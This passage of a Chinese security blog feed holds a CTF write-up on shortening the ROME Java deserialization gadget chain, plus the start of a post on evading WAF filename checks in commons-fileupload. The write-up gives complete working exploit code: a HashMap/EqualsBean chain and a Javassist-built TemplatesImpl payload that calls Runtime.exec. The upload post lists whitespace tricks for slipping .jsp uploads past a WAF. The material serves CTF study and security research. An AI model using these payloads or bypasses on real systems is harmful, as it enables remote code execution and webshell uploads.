class="keyword">return</span> path</span><br></pre></td></tr></table></figure><p>利用一：</p><p><img src="/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/3.png"></p><p>利用二：</p><p><img src="/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/2.png"></p><p>总的来说还是学的挺多，挺有收获的一个比赛</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROME改造计划</title>
      <link href="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/"/>
      <url>/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ROME改造计划"><a href="#ROME改造计划" class="headerlink" title="ROME改造计划"></a>ROME改造计划</h1><h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><p>从ysoserial原本的4000+缩短到1320（Base64+弹计算器）</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​    首先非常感谢这次的D^3CTF给我一次学习的机会，两个Java题都挺有意思学到了不同的东西，因为第二个比较简单就不分享了，这里分享一下如何去缩短ROME利用链，本身我也是之前没学习过ROME，这里以一个旁观者的视角来讲述好累，全篇没有各种高级技术不涉及<code>ASM</code>的改造，仅仅只是一些Trick和利用链的精简，同时非常感谢我的同学@HolaAs以及我的朋友@风潇在我做题过程当中给我的帮助</p><h2 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h2><p>首先看看路由，很简单要求传入字符长度不超过1956</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/1.png"></p><p>接下来免不了找依赖后面发现了ROME可以用，在ysoserial里面直接食用，可以惊讶的看到这里只有短短的4400那么“短”，痛！太痛了！</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/2.png"></p><p>哎呀怎么办呢？既然要改造免不了需要先看看调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="comment"> * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span></span><br><span class="line"><span class="comment"> * NativeMethodAccessorImpl.invoke(Object, Object[])</span></span><br><span class="line"><span class="comment"> * DelegatingMethodAccessorImpl.invoke(Object, Object[])</span></span><br><span class="line"><span class="comment"> * Method.invoke(Object, Object...)</span></span><br><span class="line"><span class="comment"> * ToStringBean.toString(String)</span></span><br><span class="line"><span class="comment"> * ToStringBean.toString()</span></span><br><span class="line"><span class="comment"> * ObjectBean.toString()</span></span><br><span class="line"><span class="comment"> * EqualsBean.beanHashCode()</span></span><br><span class="line"><span class="comment"> * ObjectBean.hashCode()</span></span><br><span class="line"><span class="comment"> * HashMap&lt;K,V&gt;.hash(Object)</span></span><br><span class="line"><span class="comment"> * HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>既然要改造我的思路是，先精简利用链，再减少细节</p><p>看到这里我能有个想法就是从调用readObject到tostring都能尝试类替换，最下层的个人感觉似乎没啥必要了，那直接再往上啰？</p><h2 id="简单了解"><a href="#简单了解" class="headerlink" title="简单了解"></a>简单了解</h2><p>很明显，既然要尝试去改造一条链子，那第一步就要去深入了解他！</p><p>这里就省去介绍<code>ObjectBean</code>、<code>ToStringBean</code>等类了百度都有，不做搬运工</p><p>先做个简单总结</p><ol><li>HashMap-&gt;readObject 触发 ObjectBean-&gt;hashCode</li><li>触发ObjectBean 内封装的 ObjectBean -&gt; toString 方法，之后就可以触发利用链</li></ol><p>也简单看看图啰<img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/4.png"></p><p>EqualsBean触发toString</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/6.png"></p><p>紧接着<code>com.sun.syndication.feed.impl.ToStringBean#toString(java.lang.String)</code>会调用所有 getter 方法，多提一嘴其实<code>BeanIntrospector.getPropertyDescriptors</code>会获取所有getter/setter，但是下面有参数长度0那按照正常人代码就只剩getter了</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/7.png"></p><p>因此最终通过触发getOutputProperties实现字节码加载</p><p>通常ysoserial更细节，会多很多细节，可能会更短，但不影响，这里我们简单按照逻辑写一下代码，加深理解</p><p>果然不出我所料更长了！</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/6.png"></p><p>但这里主要是学习思路</p><h2 id="改造"><a href="#改造" class="headerlink" title="改造"></a>改造</h2><h3 id="失败滴改造尝试"><a href="#失败滴改造尝试" class="headerlink" title="失败滴改造尝试"></a>失败滴改造尝试</h3><p>可以很明显的看到在这里有个触发toString的过程，那么很容易就能想到之前通过<code>BadAttributeValueExpException</code>去触发<code>toString</code>这件事，构造完后看看，哦寄了！属于是帮倒忙第一名了，拜拜再见不联系了嘞！</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/3.png"></p><h3 id="成功滴改造尝试"><a href="#成功滴改造尝试" class="headerlink" title="成功滴改造尝试"></a>成功滴改造尝试</h3><h4 id="Step1–改造利用链"><a href="#Step1–改造利用链" class="headerlink" title="Step1–改造利用链"></a>Step1–改造利用链</h4><p>在之前的过程当中有个地方非常吸引我，<code>com.sun.syndication.feed.impl.EqualsBean#equals</code>方法</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/8.png"></p><p>可以看到<code>equals</code>最终调用<code>beanEquals</code>这不就和<code>com.sun.syndication.feed.impl.ToStringBean#toString</code>很像么，但是如何能触发<code>equals</code>方法呢</p><p>借用p牛的一句话，但是jdk7u21的场景不适合我们这里，原因请看p牛知识星球（打波广告p牛看到请给钱）</p><blockquote><p>调用equals的场景就是集合set。set中储存的对象不允许重复，所以在添加对象的时候，势必会涉及到比较操作</p></blockquote><p>但是这个很明显并不适合我们这个场景（两个相同对象hashCode都一样了就不可能成功了，不多说自己想）</p><p>那还有啥利用么，当然有的，比如HashMap对key也有这个神奇的机制，</p><p>为了解决这个问题，我们抽丝剥茧慢慢来啰，下面的只是对后面做铺垫</p><p>先来个简单的场景，首先看下面这个代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">HashMap&lt;Object, Object&gt; objectObjectHashMap1 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">objectObjectHashMap.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">objectObjectHashMap1.put(<span class="string">&quot;bB&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">System.out.println(objectObjectHashMap.hashCode());</span><br><span class="line">System.out.println(objectObjectHashMap1.hashCode());</span><br></pre></td></tr></table></figure><p>会觉得他们相同吗，答案很显然</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/9.png"></p><p>为什么呢，可以看到，由于我们value为空其实就是比较key的hashCode了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于一个String类型其hashCode，考虑两个元素的场景也就是<code>31*val[0]+val[1]=31val[0]+val[1]</code>，因此第一个元素如果比第二个元素小1，第二个元素就必须比第一个元素大31</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/10.png"></p><p>现在场景提升</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">objectObjectHashMap.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">objectObjectHashMap.put(<span class="string">&quot;bB&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">objectObjectHashMap1.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">objectObjectHashMap1.put(<span class="string">&quot;bB&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>仍然相等，对于这个场景里面有两个元素，它会调用父类的<code>java.util.AbstractMap#hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">  Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">  <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">    h += i.next().hashCode();</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了简化理解可以把上面的场景代码简化为(毕竟<code>aa</code>与<code>bB</code>相等)，这样看是不是就很好理解了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">objectObjectHashMap.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">objectObjectHashMap.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">objectObjectHashMap1.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">objectObjectHashMap1.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>有了这个基础，再次回到我们构造ROME的过程当中</p><p>现在我们已经知道了<code>java.util.HashMap#putVal</code>在key的hashCode一致的时候会触发equals方法调用，但是此刻我们的代码的key是String类型调用了也没用啊，这里很巧的是在HashMap的equals方法当中,当对象大于1时会转而调用父类<code>java.util.AbstractMap#equals</code>,可以很明显看到这里调用了<code>value.equals</code>，同时这里我们需要将<code>equals</code>的传参数改为<code>TemplatesImpl</code>对象</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/11.png"></p><p>那如何搞定呢，那就是把两个map的value颠倒一下具体为什么自己想想很简单(“aa”=&gt;bean.quals(“aa”=&gt;templates))这里<code>=&gt;</code>表示对应</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">map1.put(<span class="string">&quot;aa&quot;</span>,templates);</span><br><span class="line">map1.put(<span class="string">&quot;bB&quot;</span>,bean);</span><br><span class="line">map2.put(<span class="string">&quot;aa&quot;</span>,bean);</span><br><span class="line">map2.put(<span class="string">&quot;bB&quot;</span>,templates);</span><br></pre></td></tr></table></figure><p>因此安这个思路我们可以得到</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/12.png"></p><p>痛！太痛了！不过还是缩了一千多了？</p><p>仔细一想罪魁祸首就是<code> Gadgets.createTemplatesImpl(command);</code></p><h4 id="Step2–超级小Trick"><a href="#Step2–超级小Trick" class="headerlink" title="Step2–超级小Trick"></a>Step2–超级小Trick</h4><p>那我们来看看这个ysoserial生成的类是啥样子<img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/14.png"></p><p>这里很多东西我们都可以改，啥<code>serialVersionUID</code>、<code>Pwner311912468728708</code>、等等这些都可以拿下</p><p>但是你以为这样就ok了，给大家看个骚的</p><p>没有<code>trycatch</code>，没有实现抽象类的方法，这怎么实现的！！！</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/15.png"></p><p>我们平时javac编译的时候，同样的代码都会报错</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/16.png"></p><p>那上面这个咋搞的嘞，而且不报错，那就是javassist啰，不用ASM去操作好极了</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/17.png"></p><p>现在再看看长度嘞，<code>1324</code>小草莓坏笑</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/18.png"></p><p>测试下嘞ok计算器来了，记得url编码一下哦！</p><p><img src="/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/19.png"></p><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><p>Rome.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> sec.payload.Payload.setFieldValue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rome</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl();</span><br><span class="line">EqualsBean bean = <span class="keyword">new</span> EqualsBean(String.class,<span class="string">&quot;&quot;</span>);</span><br><span class="line">HashMap map1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">HashMap map2 = <span class="keyword">new</span> HashMap();</span><br><span class="line">map1.put(<span class="string">&quot;aa&quot;</span>,templates);</span><br><span class="line">map1.put(<span class="string">&quot;bB&quot;</span>,bean);</span><br><span class="line">map2.put(<span class="string">&quot;aa&quot;</span>,bean);</span><br><span class="line">map2.put(<span class="string">&quot;bB&quot;</span>,templates);</span><br><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(map1,<span class="string">&quot;&quot;</span>);</span><br><span class="line">map.put(map2,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">setFieldValue(bean,<span class="string">&quot;_beanClass&quot;</span>,Templates.class);</span><br><span class="line">setFieldValue(bean,<span class="string">&quot;_obj&quot;</span>,templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(map);</span><br><span class="line">System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).length());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GetTemplatesImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetTemplatesImpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;GenerateEvilByJavaassist.generate()&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GenerateEvilByJavaassist.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenerateEvilByJavaassist</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] generate() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        CtClass superClass = pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        CtConstructor constructor = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java文件上传大杀器-绕waf(针对commons-fileupload组件)</title>
      <link href="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/"/>
      <url>/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Java文件上传大杀器-绕waf-针对commons-fileupload组件"><a href="#Java文件上传大杀器-绕waf-针对commons-fileupload组件" class="headerlink" title="Java文件上传大杀器-绕waf(针对commons-fileupload组件)"></a>Java文件上传大杀器-绕waf(针对commons-fileupload组件)</h1><p>PS：高版本才有1.3以上</p><p>来个中二的标题，哈哈哈，灵感来源于昨晚赛博群有个师傅@我是killer发了篇新文章，在那篇文章当中提到了在<code>filename=&quot;1.jsp&quot;</code>的filename字符左右可以加上一些空白字符<code>%20 %09 %0a %0b %0c %0d %1c %1d %1e %1f</code>，比如<code>%20filename%0a=&quot;1.jsp&quot;(直接用url编码为了区别)</code>这样导致waf匹配不到我们上传⽂件 名，⽽我们上传依然可以解析，我对次进行了更深入的研究，也是对师傅文章对一次补充，下面为了衔接还是先梳理一遍，看过赛博群的师傅可以先跳过前面的部分，直接看最后一部分(毕竟我想发个博客)</p><h2 id="上传代码"><a href="#上传代码" class="headerlink" title="上传代码"></a>上传代码</h2><p>针对使⽤commons-fileupload处理⽂件上传</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String path = <span class="string">&quot;/Users/y4tacker/Desktop/JavaStudy/testtest&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServletFileUpload servletFileUpload = <span class="keyword">new</span> ServletFileUpload(<span class="keyword">new</span> DiskFileItemFactory());</span><br><span class="line">            servletFileUpload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            List&lt;FileItem&gt; fileItems = servletFileUpload.parseRequest(request);</span><br><span class="line">            <span class="keyword">for</span> (FileItem fileItem : fileItems) &#123;</span><br><span class="line">                response.getWriter().write(fileItem.getName());</span><br><span class="line">                fileItem.write(<span class="keyword">new</span> File(path+<span class="string">&quot;/&quot;</span>+fileItem.getName()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="前置分析"><a href="#前置分析" class="headerlink" title="前置分析"></a>前置分析</h2><p>将断点打在<code>servletFileUpload.parseRequest(request)</code>,跟入<code>getItemIterator</code><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/1.png"></p><p>一直往下到<code>org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl</code></p><p><code>Content-Type</code> 要开头为 <code>multipart/</code> <img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/2.png"></p><p>接下来对流的处理部分忽略，到下面有个<code>this.boundary = FileUploadBase.this.getBoundary(contentType);</code>,因为文件上传的格式就是,可以猜出这里就是解析这一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryTyBDoKvamN58lcEw</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;1.jsp&quot;</span><br><span class="line"></span><br><span class="line">233</span><br><span class="line">------WebKitFormBoundaryTyBDoKvamN58lcEw--</span><br></pre></td></tr></table></figure><p>当时师傅跳过中间一些部分到了<code>org.apache.commons.fileupload.FileUploadBase#getFileName(java.lang.String)</code></p><p><img src="/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/3.png"></p><p>在<code>parser.parse(pContentDisposition, &#39;;&#39;);</code>，简单说下作用是先⽤分号将 <code>form-data; name=&quot;file&quot;; filename=&quot;1.jsp&quot;</code> 分割然后获取 等于号前⾯的值，这里我们看看到getToken当中的栈（方便大家调试）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getToken:99, ParameterParser (org.apache.commons.fileupload)</span><br><span class="line">parseToken:162, ParameterParser (org.apache.commons.fileupload)</span><br><span class="line">parse:311, ParameterParser (org.apache.commons.fileupload)</span><br><span class="line">parse:279, ParameterParser (org.apache.commons.fileupload)</span><br><span class="line">parse:262, ParameterParser (org.apache.commons.fileupload)</span><br><span class="line">parse:246, ParameterParser (org.apache.commons.fileupload)</span><br><span class="line">getBoundary:423, FileUploadBase 